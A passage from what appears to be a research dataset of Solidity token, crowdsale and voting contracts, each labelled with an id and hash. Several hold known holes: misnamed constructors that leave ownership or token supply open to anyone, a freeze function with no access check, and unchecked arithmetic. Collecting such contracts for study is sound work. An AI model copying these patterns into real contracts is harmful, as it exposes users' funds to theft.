        return true;
      }
      return false;      
  }
  function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
      if(!frozenAccount[msg.sender] && balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {
        balances[_to] += _value;
        balances[_from] -= _value;
        allowed[_from][msg.sender] -= _value;
        Transfer(_from, _to, _value);
        return true;
      }
      return false;
  }
  function burn(uint256 _value) returns (bool success) {
    if (balances[msg.sender] < _value) throw;            
    balances[msg.sender] -= _value;                      
    totalSupply -= _value;                                
    Burn(msg.sender, _value);
    return true;
  }
  function burnFrom(address _from, uint256 _value) returns (bool success) {
    if (balances[_from] < _value) throw;                
    if (_value > allowed[_from][msg.sender]) throw;    
    balances[_from] -= _value;                          
    totalSupply -= _value;                               
    Burn(_from, _value);
    return true;
  }
  function freezeAccount(address _target, bool frozen){
    frozenAccount[_target] = frozen;
    FrozenFunds(_target, frozen);
  }
  function getDecimals() public returns (uint256){
    return decimals;
  }
  function getOwner() public returns (address){
    return kairosOwner;
  }
}
```

## RQ1_e1ca494df5a4

SHA-256 `a68fc986d49af65bb32709a2ee3afeae37acb4438b6e1cc9740ccd4d7088d787`

```solidity
pragma solidity ^0.5.1;
contract Ownable {
  address public owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  constructor() public payable{
    owner = msg.sender;
  }
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }
  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }
}
contract Pausable is Ownable {
  event Pause();
  event Unpause();
  bool public paused = false;
  modifier whenNotPaused() {
    require(!paused);
    _;
  }
  modifier whenPaused() {
    require(paused);
    _;
  }
  function pause() onlyOwner whenNotPaused public {
    paused = true;
    emit Pause();
  }
  function unpause() onlyOwner whenPaused public {
    paused = false;
    emit Unpause();
  }
}
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
function ceil(uint256 a, uint256 m) internal pure returns (uint256) {
    uint256 c = add(a,m);
    uint256 d = sub(c,1);
    return mul(div(d,m),m);
  }
}
contract ERC20Basic {
  uint256 public totalSupply;
  function balanceOf(address who) public view returns (uint256);
  function transfer(address to, uint256 value) public returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
}
contract ERC20 is ERC20Basic {
  function allowance(address owner, address spender) public view returns (uint256);
  function transferFrom(address from, address to, uint256 value) public returns (bool);
  function approve(address spender, uint256 value) public returns (bool);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract BasicToken is ERC20Basic {
  using SafeMath for uint256;
  uint256 public basePercent = 100;
  mapping(address => uint256) balances;
 function findTwoAnfHalfPercent(uint256 value) public view returns (uint256)  {
    uint256 roundValue = value.ceil(basePercent);
    uint256 onePercent = roundValue.mul(basePercent).div(4000);
    return onePercent;
  }
  function transfer(address to, uint256 value) public returns (bool) {
    require(to != address(0));
    require(value <= balances[msg.sender]);
    uint256 tokensToBurn = findTwoAnfHalfPercent(value);
    uint256 tokensToTransfer = value.sub(tokensToBurn);
     balances[msg.sender] = balances[msg.sender].sub(value);
     balances[to] = balances[to].add(tokensToTransfer);
    totalSupply = totalSupply.sub(tokensToBurn);
    emit Transfer(msg.sender, to, tokensToTransfer);
    emit Transfer(msg.sender, address(0), tokensToBurn);
    return true;
  }
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
  }
}
contract BurnableToken is BasicToken {
    event Burn(address indexed burner, uint256 value);
    function burn(uint256 _value) public {
        require(_value <= balances[msg.sender]);
        address burner = msg.sender;
        balances[burner] = balances[burner].sub(_value);
        totalSupply = totalSupply.sub(_value);
        emit Burn(burner, _value);
    }
}
contract StandardToken is ERC20, BasicToken {
  mapping (address => mapping (address => uint256)) internal allowed;
  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[_from]);
    require(_value <= allowed[_from][msg.sender]);
    balances[_from] = balances[_from].sub(_value);
    balances[_to] = balances[_to].add(_value);
    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
    emit Transfer(_from, _to, _value);
    return true;
  }
  function approve(address _spender, uint256 _value) public returns (bool) {
    allowed[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }
  function allowance(address _owner, address _spender) public view returns (uint256) {
    return allowed[_owner][_spender];
  }
  function increaseApproval(address _spender, uint _addedValue) public returns (bool) {
    allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);
    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
    return true;
  }
  function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {
    uint oldValue = allowed[msg.sender][_spender];
    if (_subtractedValue > oldValue) {
      allowed[msg.sender][_spender] = 0;
    } else {
      allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);
    }
    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
    return true;
  }
}
contract EqvcTokens is StandardToken, Ownable {
    string public constant symbol = "EQVC";
    string public constant name = "EqvcToken";
    uint8 public constant decimals = 0;
    uint256 public constant INITIAL_SUPPLY = 2000000;
    uint256 public constant TOKEN_OFFERING_ALLOWANCE = 2000000;
    uint256 public constant ADMIN_ALLOWANCE = INITIAL_SUPPLY - TOKEN_OFFERING_ALLOWANCE;
    address public adminAddr;
	  address public tokenOfferingAddr;
    bool public transferEnabled = false;
    modifier onlyWhenTransferAllowed() {
        require(transferEnabled || msg.sender == adminAddr || msg.sender == tokenOfferingAddr);
        _;
    }
    modifier onlyTokenOfferingAddrNotSet() {
        require(tokenOfferingAddr == address(0x0));
        _;
    }
    modifier validDestination(address to) {
        require(to != address(0x0));
        require(to != address(this));
        require(to != owner);
        require(to != address(adminAddr));
        require(to != address(tokenOfferingAddr));
        _;
    }
    function EqvcToken(address admin) public {
        totalSupply = INITIAL_SUPPLY;
        balances[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
        adminAddr = admin;
        approve(adminAddr, ADMIN_ALLOWANCE);
    }
    function setTokenOffering(address offeringAddr, uint256 amountForSale) external onlyOwner onlyTokenOfferingAddrNotSet {
        require(!transferEnabled);
        uint256 amount = (amountForSale == 0) ? TOKEN_OFFERING_ALLOWANCE : amountForSale;
        require(amount <= TOKEN_OFFERING_ALLOWANCE);
        approve(offeringAddr, amount);
        tokenOfferingAddr = offeringAddr;
    }
    function enableTransfer() external onlyOwner {
        transferEnabled = true;
        approve(tokenOfferingAddr, 0);
    }
    function transfer(address to, uint256 value) public onlyWhenTransferAllowed validDestination(to) returns (bool) {
        return super.transfer(to, value);
    }
    function transferFrom(address from, address to, uint256 value) public onlyWhenTransferAllowed validDestination(to) returns (bool) {
        return super.transferFrom(from, to, value);
    }
}
contract EqvcsCrowdsale is Pausable {
    using SafeMath for uint256;
    EqvcTokens public token;
    uint256 public startTime;
    uint256 public endTime;
    address payable  beneficiary;
    uint256 public rate;
    uint256 public EthRaised;
    uint256 public capReleaseTimestamp;
    uint256 public extraTime;
    mapping(address => uint256) public contributions;
     uint256 public constant FUNDING_ETH_HARD_CAP = 1300;
    uint256 public minContribution = 1 ;
    uint256 public maxContribution = 15;
     uint256 public remainCap;
    Stages public stage;
    enum Stages { 
        Setup,
        OfferingStarted,
        OfferingEnded
    }
    event OfferingOpens(uint256 startTime, uint256 endTime);
    event OfferingCloses(uint256 endTime, uint256 totalEthRaised);
    event TokenPurchase(address indexed purchaser, uint256 value, uint256 amount);
    modifier atStage(Stages expectedStage) {
        require(stage == expectedStage);
        _;
    }
    function EqvcCrowdsale(
        uint256 eqvcToEtherRate, 
        address payable beneficiaryAddr, 
        address tokenAddress
    ) public {
        require(eqvcToEtherRate > 0);
        require(beneficiaryAddr != address(0));
        require(tokenAddress != address(0));
        token = EqvcTokens(tokenAddress);
        rate = eqvcToEtherRate;
        beneficiary = beneficiaryAddr;
        stage = Stages.Setup;
    }
    function ()  payable external {
        buy();
    }
    function ownerSafeWithdrawal() external onlyOwner {
        beneficiary.transfer(address(this).balance);
    }
    function updateRate(uint256 eqvcToEtherRate) public onlyOwner atStage(Stages.Setup) {
        rate = eqvcToEtherRate;
    }
    function startOffering(uint256 durationInSeconds) public onlyOwner atStage(Stages.Setup) {
        stage = Stages.OfferingStarted;
        startTime = now;
        capReleaseTimestamp = startTime + 1 days;
        extraTime = capReleaseTimestamp + 365 days;
        endTime = extraTime.add(durationInSeconds);
        emit OfferingOpens(startTime, endTime);
    }
    function endOffering() public onlyOwner atStage(Stages.OfferingStarted) {
        endOfferingImpl();
    }
    function buy() public payable whenNotPaused atStage(Stages.OfferingStarted) returns (bool) {
              buyTokens();
              return true;
        revert();
    }
    function hasEnded() public view returns (bool) {
        return now > endTime || stage == Stages.OfferingEnded;
    }
    modifier validPurchase() {
        require(now >= startTime && now <= endTime && stage == Stages.OfferingStarted);
        if(now > capReleaseTimestamp) {
          maxContribution = 2000;
        }
        uint256 contributionInETH = uint256(msg.value).div(10**18);
        address participant = msg.sender; 
        require(contributionInETH <= maxContribution.sub(contributions[participant]));
        require(participant != address(0) && contributionInETH >= minContribution && contributionInETH <= maxContribution);
        require(EthRaised.add(contributionInETH) <= FUNDING_ETH_HARD_CAP);
        _;
    }
    function buyTokens() internal validPurchase {
        uint256 contributionInETH = uint256(msg.value).div(10**18);
        address participant = msg.sender;
        uint256 tokens = contributionInETH.mul(rate);
        if (!token.transferFrom(token.owner(), participant, tokens)) {
            revert();
        }
        EthRaised = EthRaised.add(contributionInETH);
        contributions[participant] = contributions[participant].add(contributionInETH);
        remainCap = FUNDING_ETH_HARD_CAP.sub(EthRaised);
        if (EthRaised >= FUNDING_ETH_HARD_CAP) {
            endOfferingImpl();
        }
        beneficiary.transfer(contributionInETH.mul(10**18));
        emit TokenPurchase(msg.sender, contributionInETH, tokens);          
    }
    function endOfferingImpl() internal{
        endTime = now;
        stage = Stages.OfferingEnded;
        emit OfferingCloses(endTime, EthRaised);
    }
    function allocateTokens(address to, uint256 tokens) public onlyOwner returns (bool) {
        if (!token.transferFrom(token.owner(), to, tokens)) {
            revert();
        }
        return true;
    }
    function batchallocateTokens(address[] memory toList, uint256[] memory tokensList)  public onlyOwner  returns (bool)  {
        require(toList.length == tokensList.length);
        for (uint32 i = 0; i < toList.length; i++) {
            allocateTokens(toList[i], tokensList[i]);
        }
        return true;
    }
}
```

## RQ1_77486f861519

SHA-256 `df8c200dd8b332f0c918368e8753e1d7fd08f30d1a642aa4246a3b38dc891d3b`

```solidity
pragma solidity ^0.4.21;
interface tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) external; }
contract owned {
    address public owner;
    bool public ownershipTransferAllowed = false;
    function constructor() public {
        owner = msg.sender;
    }
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
    function allowTransferOwnership(bool flag ) public onlyOwner {
      ownershipTransferAllowed = flag;
    }
    function transferOwnership(address newOwner) public onlyOwner {
        require( newOwner != 0x0 );                                             
        require( ownershipTransferAllowed );                                 
        owner = newOwner;
        ownershipTransferAllowed = false;
    }
}
contract ECR20HoneycombToken is owned {
    string public name = "Honeycomb";
    string public symbol = "COMB";
    uint8 public decimals = 18;
    uint256 private tokenFactor = 10 ** uint256(decimals);
    uint256 private initialBuyPrice = 3141592650000000000000;                   
    uint256 private buyConst1 = 10000 * tokenFactor;                            
    uint256 private buyConst2 = 4;                                              
    uint256 public minimumPayout = 1000000000000000;							
    uint256 public totalSupply;                                                 
    uint256 public sellPrice;
    uint256 public buyPrice;
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;
    event Transfer(address indexed from, address indexed to, uint256 value);
    function ECR20HoneycombToken() public {
        totalSupply = 1048576 * tokenFactor;                                    
        balanceOf[msg.sender] = totalSupply;                                    
        owner = msg.sender;			                                            
        emit Transfer(0, owner, totalSupply);                                   
        _transfer(owner, this, totalSupply - (16384*tokenFactor));              
        _setPrices(_newPrice(balanceOf[this]));                                 
    }
    function _newPrice(uint256 tokenLeft) internal view returns (uint256 newPrice) {
        newPrice = initialBuyPrice 
            * ( tokenLeft * buyConst1 )
            / ( totalSupply*buyConst1 + totalSupply*tokenLeft/buyConst2 - tokenLeft*tokenLeft/buyConst2 ); 
        return newPrice;
    }
    function _setPrices(uint256 newPrice) internal {
        buyPrice = newPrice;
        sellPrice = buyPrice * 141421356 / 100000000;                           
    }
	function buy() payable public returns (uint256 amountToken){
        amountToken = msg.value * buyPrice / tokenFactor;                       
        uint256 newPrice = _newPrice(balanceOf[this] - amountToken);            
        require( (2*newPrice) > sellPrice);                                     
        _transfer(this, msg.sender, amountToken);                               
        _setPrices( newPrice );                                                 
        return amountToken;
    }
	function () payable public {
	    buy();
    }
    function sell(uint256 amountToken) public returns (uint256 revenue){
        revenue = amountToken * tokenFactor / sellPrice;                        
        require( revenue >= minimumPayout );									
        uint256 newPrice = _newPrice(balanceOf[this] + amountToken);            
        require( newPrice < sellPrice );                                        
        _transfer(msg.sender, this, amountToken);                               
        _setPrices( newPrice );                                                 
        msg.sender.transfer(revenue);                                           
        return revenue;
    }
    function transfer(address _to, uint256 _value) public {
        if ( _to  == address(this) )
        {
          sell(_value);                                                         
        }
        else
        {
          _transfer(msg.sender, _to, _value);
        }
    }
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }
    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }
    function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }
		function setMinimumPayout(uint256 amount) public onlyOwner {
		minimumPayout = amount;
    }
		function save(uint256 amount) public onlyOwner {
        require( amount >= minimumPayout );	
        owner.transfer( amount);
    }
		function restore(uint256 amount) public onlyOwner {
        uint256 newPrice = _newPrice(balanceOf[this] + amount);                 
        _transfer(owner, this, amount );                                        
        _setPrices( newPrice );                                                 
    }
    function _transfer(address _from, address _to, uint _value) internal {
        require(_to != 0x0);
        require(balanceOf[_from] >= _value);
        require(balanceOf[_to] + _value > balanceOf[_to]);
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }
}
```

## RQ1_8e285b5fe9e2

SHA-256 `6af074187d56782df2cf29d3351fee44a835c933f34558482058b91ead3064f9`

```solidity
pragma solidity ^0.4.22;
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract ForeignToken {
    function balanceOf(address _owner) constant public returns (uint256);
    function transfer(address _to, uint256 _value) public returns (bool);
}
contract ERC20Basic {
    uint256 public totalSupply;
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}
contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public constant returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface Token { 
    function distr(address _to, uint256 _value) external returns (bool);
    function totalSupply() constant external returns (uint256 supply);
    function balanceOf(address _owner) constant external returns (uint256 balance);
}
contract Predatex is ERC20 {
    using SafeMath for uint256;
    address owner = msg.sender;
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    mapping (address => bool) public blacklist;
    string public constant name = "Predatex";
    string public constant symbol = "PDTX";
    uint public constant decimals = 8;
uint256 public totalSupply = 21000000000e8;
uint256 public totalDistributed = 10000000000e8;
uint256 public totalRemaining = totalSupply.sub(totalDistributed);
uint256 public value = 100000e8;
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event Distr(address indexed to, uint256 amount);
    event DistrFinished();
    event Burn(address indexed burner, uint256 value);
    bool public distributionFinished = false;
    modifier canDistr() {
        require(!distributionFinished);
        _;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    modifier onlyWhitelist() {
        require(blacklist[msg.sender] == false);
        _;
    }
    function Predatex1() public {
        owner = msg.sender;
        balances[owner] = totalDistributed;
    }
    function transferOwnership(address newOwner) onlyOwner public {
        if (newOwner != address(0)) {
            owner = newOwner;
        }
    }
    function finishDistribution() onlyOwner canDistr public returns (bool) {
        distributionFinished = true;
        emit DistrFinished();
        return true;
    }
    function distr(address _to, uint256 _amount) canDistr private returns (bool) {
        totalDistributed = totalDistributed.add(_amount);
        totalRemaining = totalRemaining.sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Distr(_to, _amount);
        emit Transfer(address(0), _to, _amount);
        return true;
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
    }
    function () external payable {
        getTokens();
     }
    function getTokens() payable canDistr onlyWhitelist public {
        if (value > totalRemaining) {
            value = totalRemaining;
        }
        require(value <= totalRemaining);
        address investor = msg.sender;
        uint256 toGive = value;
        distr(investor, toGive);
        if (toGive > 0) {
            blacklist[investor] = true;
        }
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
        value = value.div(100000).mul(99999);
    }
    function balanceOf(address _owner) constant public returns (uint256) {
        return balances[_owner];
    }
    modifier onlyPayloadSize(uint size) {
        assert(msg.data.length >= size + 4);
        _;
    }
    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(msg.sender, _to, _amount);
        return true;
    }
    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);
        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(_from, _to, _amount);
        return true;
    }
    function approve(address _spender, uint256 _value) public returns (bool success) {
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    }
    function getTokenBalance(address tokenAddress, address who) constant public returns (uint){
        ForeignToken t = ForeignToken(tokenAddress);
        uint bal = t.balanceOf(who);
        return bal;
    }
    function withdraw() onlyOwner public {
        uint256 etherBalance = address(this).balance;
        owner.transfer(etherBalance);
    }
    function burn(uint256 _value) onlyOwner public {
        require(_value <= balances[msg.sender]);
        address burner = msg.sender;
        balances[burner] = balances[burner].sub(_value);
        totalSupply = totalSupply.sub(_value);
        totalDistributed = totalDistributed.sub(_value);
        emit Burn(burner, _value);
    }
    function withdrawForeignTokens(address _tokenContract) onlyOwner public returns (bool) {
        ForeignToken token = ForeignToken(_tokenContract);
        uint256 amount = token.balanceOf(address(this));
        return token.transfer(owner, amount);
    }
}
```

## RQ1_5558fa8f4749

SHA-256 `50bae4cf3e621f5771dde6e99e8db659412b8af8e90f497163261a8cf7481ebf`

```solidity
contract EIP20Interface {
    uint256 public totalSupply;
    function balanceOf(address _owner) public view returns (uint256 balance);
    function transfer(address _to, uint256 _value) public returns (bool success);
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);
    function approve(address _spender, uint256 _value) public returns (bool success);
    function allowance(address _owner, address _spender) public view returns (uint256 remaining);
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}
contract EIP20 is EIP20Interface {
    uint256 constant MAX_UINT256 = 2**256 - 1;
    string public name;                   
    uint8 public decimals;                
    string public symbol;                 
     function EIP20(
        uint256 _initialAmount,
        string _tokenName,
        uint8 _decimalUnits,
        string _tokenSymbol
        ) public {
        balances[msg.sender] = _initialAmount;               
        totalSupply = _initialAmount;                        
        name = _tokenName;                                   
        decimals = _decimalUnits;                            
        symbol = _tokenSymbol;                               
    }
    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balances[msg.sender] >= _value);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        Transfer(msg.sender, _to, _value);
        return true;
    }
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        uint256 allowance = allowed[_from][msg.sender];
        require(balances[_from] >= _value && allowance >= _value);
        balances[_to] += _value;
        balances[_from] -= _value;
        if (allowance < MAX_UINT256) {
            allowed[_from][msg.sender] -= _value;
        }
        Transfer(_from, _to, _value);
        return true;
    }
    function balanceOf(address _owner) view public returns (uint256 balance) {
        return balances[_owner];
    }
    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }
    function allowance(address _owner, address _spender)
    view public returns (uint256 remaining) {
      return allowed[_owner][_spender];
    }
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
}
library DLL {
  uint constant NULL_NODE_ID = 0;
  struct Node {
    uint next;
    uint prev;
  }
  struct Data {
    mapping(uint => Node) dll;
  }
  function isEmpty(Data storage self) public view returns (bool) {
    return getStart(self) == NULL_NODE_ID;
  }
  function contains(Data storage self, uint _curr) public view returns (bool) {
    if (isEmpty(self) || _curr == NULL_NODE_ID) {
      return false;
    } 
    bool isSingleNode = (getStart(self) == _curr) && (getEnd(self) == _curr);
    bool isNullNode = (getNext(self, _curr) == NULL_NODE_ID) && (getPrev(self, _curr) == NULL_NODE_ID);
    return isSingleNode || !isNullNode;
  }
  function getNext(Data storage self, uint _curr) public view returns (uint) {
    return self.dll[_curr].next;
  }
  function getPrev(Data storage self, uint _curr) public view returns (uint) {
    return self.dll[_curr].prev;
  }
  function getStart(Data storage self) public view returns (uint) {
    return getNext(self, NULL_NODE_ID);
  }
  function getEnd(Data storage self) public view returns (uint) {
    return getPrev(self, NULL_NODE_ID);
  }
  function insert(Data storage self, uint _prev, uint _curr, uint _next) public {
    require(_curr != NULL_NODE_ID);
    require(_prev == NULL_NODE_ID || contains(self, _prev));
    remove(self, _curr);
    require(getNext(self, _prev) == _next);
    self.dll[_curr].prev = _prev;
    self.dll[_curr].next = _next;
    self.dll[_prev].next = _curr;
    self.dll[_next].prev = _curr;
  }
  function remove(Data storage self, uint _curr) public {
    if (!contains(self, _curr)) {
      return;
    }
    uint next = getNext(self, _curr);
    uint prev = getPrev(self, _curr);
    self.dll[next].prev = prev;
    self.dll[prev].next = next;
    delete self.dll[_curr];
  }
}
library AttributeStore {
    struct Data {
        mapping(bytes32 => uint) store;
    }
    function getAttribute(Data storage self, bytes32 _UUID, string _attrName)
    public view returns (uint) {
        bytes32 key = keccak256(_UUID, _attrName);
        return self.store[key];
    }
    function setAttribute(Data storage self, bytes32 _UUID, string _attrName, uint _attrVal)
    public {
        bytes32 key = keccak256(_UUID, _attrName);
        self.store[key] = _attrVal;
    }
}
contract PLCRVoting {
    event VoteCommitted(address voter, uint pollID, uint numTokens);
    event VoteRevealed(address voter, uint pollID, uint numTokens, uint choice);
    event PollCreated(uint voteQuorum, uint commitDuration, uint revealDuration, uint pollID);
    event VotingRightsGranted(address voter, uint numTokens);
    event VotingRightsWithdrawn(address voter, uint numTokens);
    using AttributeStore for AttributeStore.Data;
    using DLL for DLL.Data;
    struct Poll {
        uint commitEndDate;     
        uint revealEndDate;     
        uint voteQuorum;	    
        uint votesFor;		    
        uint votesAgainst;      
    }
    uint constant public INITIAL_POLL_NONCE = 0;
    uint public pollNonce;
    mapping(uint => Poll) public pollMap; 
    mapping(address => uint) public voteTokenBalance; 
    mapping(address => DLL.Data) dllMap;
    AttributeStore.Data store;
    EIP20 public token;
    function PLCRVoting(address _tokenAddr) public {
        token = EIP20(_tokenAddr);
        pollNonce = INITIAL_POLL_NONCE;
    }
    function requestVotingRights(uint _numTokens) external {
        require(token.balanceOf(msg.sender) >= _numTokens);
        require(token.transferFrom(msg.sender, this, _numTokens));
        voteTokenBalance[msg.sender] += _numTokens;
        VotingRightsGranted(msg.sender, _numTokens);
    }
    function withdrawVotingRights(uint _numTokens) external {
        uint availableTokens = voteTokenBalance[msg.sender] - getLockedTokens(msg.sender);
        require(availableTokens >= _numTokens);
        require(token.transfer(msg.sender, _numTokens));
        voteTokenBalance[msg.sender] -= _numTokens;
        VotingRightsWithdrawn(msg.sender, _numTokens);
    }
    function rescueTokens(uint _pollID) external {
        require(pollEnded(_pollID));
        require(!hasBeenRevealed(msg.sender, _pollID));
        dllMap[msg.sender].remove(_pollID);
    }
    function commitVote(uint _pollID, bytes32 _secretHash, uint _numTokens, uint _prevPollID) external {
        require(commitPeriodActive(_pollID));
        require(voteTokenBalance[msg.sender] >= _numTokens); 
        require(_pollID != 0);                
        require(_prevPollID == 0 || getCommitHash(msg.sender, _prevPollID) != 0);
        uint nextPollID = dllMap[msg.sender].getNext(_prevPollID);
        nextPollID = (nextPollID == _pollID) ? dllMap[msg.sender].getNext(_pollID) : nextPollID;
        require(validPosition(_prevPollID, nextPollID, msg.sender, _numTokens));
        dllMap[msg.sender].insert(_prevPollID, _pollID, nextPollID);
        bytes32 UUID = attrUUID(msg.sender, _pollID);
        store.setAttribute(UUID, "numTokens", _numTokens);
        store.setAttribute(UUID, "commitHash", uint(_secretHash));
        VoteCommitted(msg.sender, _pollID, _numTokens);
    }
    function validPosition(uint _prevID, uint _nextID, address _voter, uint _numTokens) public constant returns (bool valid) {
        bool prevValid = (_numTokens >= getNumTokens(_voter, _prevID));
        bool nextValid = (_numTokens <= getNumTokens(_voter, _nextID) || _nextID == 0); 
        return prevValid && nextValid;
    }
    function revealVote(uint _pollID, uint _voteOption, uint _salt) external {
        require(revealPeriodActive(_pollID));
        require(!hasBeenRevealed(msg.sender, _pollID));                        
        require(keccak256(_voteOption, _salt) == getCommitHash(msg.sender, _pollID)); 
        uint numTokens = getNumTokens(msg.sender, _pollID); 
        if (_voteOption == 1) 
            pollMap[_pollID].votesFor += numTokens;
        else
            pollMap[_pollID].votesAgainst += numTokens;
        dllMap[msg.sender].remove(_pollID); 
        VoteRevealed(msg.sender, _pollID, numTokens, _voteOption);
    }
    function getNumPassingTokens(address _voter, uint _pollID, uint _salt) public constant returns (uint correctVotes) {
        require(pollEnded(_pollID));
        require(hasBeenRevealed(_voter, _pollID));
        uint winningChoice = isPassed(_pollID) ? 1 : 0;
        bytes32 winnerHash = keccak256(winningChoice, _salt);
        bytes32 commitHash = getCommitHash(_voter, _pollID);
        require(winnerHash == commitHash);
        return getNumTokens(_voter, _pollID);
    }
    function startPoll(uint _voteQuorum, uint _commitDuration, uint _revealDuration) public returns (uint pollID) {
        pollNonce = pollNonce + 1;
        pollMap[pollNonce] = Poll({
            voteQuorum: _voteQuorum,
            commitEndDate: block.timestamp + _commitDuration,
            revealEndDate: block.timestamp + _commitDuration + _revealDuration,
            votesFor: 0,
            votesAgainst: 0
        });
        PollCreated(_voteQuorum, _commitDuration, _revealDuration, pollNonce);
        return pollNonce;
    }
    function isPassed(uint _pollID) constant public returns (bool passed) {
        require(pollEnded(_pollID));
        Poll memory poll = pollMap[_pollID];
        return (100 * poll.votesFor) > (poll.voteQuorum * (poll.votesFor + poll.votesAgainst));
    }
    function getTotalNumberOfTokensForWinningOption(uint _pollID) constant public returns (uint numTokens) {
        require(pollEnded(_pollID));
        if (isPassed(_pollID))
            return pollMap[_pollID].votesFor;
        else
            return pollMap[_pollID].votesAgainst;
    }
    function pollEnded(uint _pollID) constant public returns (bool ended) {
        require(pollExists(_pollID));
        return isExpired(pollMap[_pollID].revealEndDate);
    }
    function commitPeriodActive(uint _pollID) constant public returns (bool active) {
        require(pollExists(_pollID));
        return !isExpired(pollMap[_pollID].commitEndDate);
    }
    function revealPeriodActive(uint _pollID) constant public returns (bool active) {
        require(pollExists(_pollID));
        return !isExpired(pollMap[_pollID].revealEndDate) && !commitPeriodActive(_pollID);
    }
    function hasBeenRevealed(address _voter, uint _pollID) constant public returns (bool revealed) {
        require(pollExists(_pollID));
        return !dllMap[_voter].contains(_pollID);
    }
    function pollExists(uint _pollID) constant public returns (bool exists) {
        uint commitEndDate = pollMap[_pollID].commitEndDate;
        uint revealEndDate = pollMap[_pollID].revealEndDate;
        assert(!(commitEndDate == 0 && revealEndDate != 0));
        assert(!(commitEndDate != 0 && revealEndDate == 0));
        if(commitEndDate == 0 || revealEndDate == 0) { return false; }
        return true;
    }
    function getCommitHash(address _voter, uint _pollID) constant public returns (bytes32 commitHash) { 
